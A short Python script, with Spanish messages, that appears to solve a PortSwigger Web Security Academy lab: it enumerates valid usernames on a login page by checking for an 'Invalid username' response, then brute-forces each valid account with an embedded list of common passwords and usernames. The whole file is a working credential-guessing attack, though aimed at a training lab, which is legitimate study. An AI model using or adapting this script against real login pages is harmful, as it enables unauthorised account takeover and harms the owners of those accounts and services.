import requests
import re
from time import sleep
from colorama import init, Fore

init(autoreset=True)

password_list = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", 
    "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", 
    "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", 
    "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", 
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", 
    "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", 
    "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", 
    "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", 
    "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", 
    "monitoring", "montana", "moon", "moscow"
]

user_list = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator", "oracle", 
    "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser", "academico", "acceso", "access", 
    "accounting", "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin", "administracion", 
    "administrador", "administrator", "administrators", "admins", "ads", "adserver", "adsl", "ae", "af", 
    "affiliate", "affiliates", "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai", "al", 
    "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind", "am", "amarillo", "americas", "an", 
    "anaheim", "analyzer", "announce", "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app", 
    "app01", "app1", "apple", "application", "applications", "apps", "appserver", "aq", "ar", "archie", 
    "arcsight", "argentina", "arizona", "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena", 
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto", "autodiscover"
]

login_url = "https://0a08000e034f9b3cab22d83f00c900f8.web-security-academy.net/login"

def usuarios_validos(username):
    
    data = {'username': username, 'password': 'anypassword'}
    response = requests.post(login_url, data=data)
    
    if "Invalid username" in response.text:
        return False
    return True

def fuerza_bruta(username, password_list):

    if usuarios_validos(username):
        print(Fore.GREEN + f"Usuario válido encontrado: {username}")
        for password in password_list:
            data = {'username': username, 'password': password}
            response = requests.post(login_url, data=data)
            
            if "incorrect" not in response.text.lower():  
                print(Fore.GREEN + f"¡Éxito! Usuario: {username}, Contraseña: {password}")
                break
            else:
                print(Fore.RED + f"Fallido: {username}, Contraseña: {password}")
            sleep(1)  
    else:
        print(Fore.RED + f"Usuario inválido: {username}")

for user in user_list:
    fuerza_bruta(user, password_list)
